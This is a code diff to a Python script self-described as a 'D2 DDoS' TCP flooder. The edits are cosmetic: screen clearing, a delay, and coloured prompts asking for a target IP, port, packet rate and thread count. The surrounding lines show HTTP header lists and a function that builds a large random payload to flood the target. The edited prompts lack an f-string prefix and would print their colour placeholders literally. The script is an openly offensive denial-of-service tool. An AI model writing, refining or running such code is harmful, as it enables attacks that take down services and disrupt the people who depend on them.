@@ -15,7 +15,7 @@ abu="\033[1;90m"
 kuning="\033[1;93m"
 ungu="\033[1;95m"
 biru="\033[1;96m"
-
+os.system("clear")
 def usage():
 	print(f"""
 {R}________   {W}    .___
@@ -24,6 +24,8 @@ def usage():
 {R}/_______  /{W}\____ |\____/____  >
 {R}        \/ {W}     \/          \/ {G}.{W}v{R}2\n""")
 
+time.sleep(2)
+print("")
 # DDOS TCP FLOODER
 # v0.0.2
 print("Welcome D2 DDoS")
@@ -56,10 +58,10 @@ acceptall=["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=
 "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
 "Accept-Language: en-US,en;q=0.5\r\n"]
 
-ip = str(input('[+] Target: '))
-port = int(input('[+] Port: '))
-pack = int(input('[+] Packet/s: '))
-thread = int(input('[+] Threads: '))
+ip = str(input('{R}[+]{Y} Target:{G} => {W}'))
+port = int(input('{R}[+]{Y} Port:{G} => {W}'))
+pack = int(input('{R}[+]{Y} Packet/s:{G} => {W}'))
+thread = int(input('{R}[+]{Y} Threads:{G} => {W}'))
 def start():
     global useragents, ref, acceptall
     hh = random._urandom(3016)
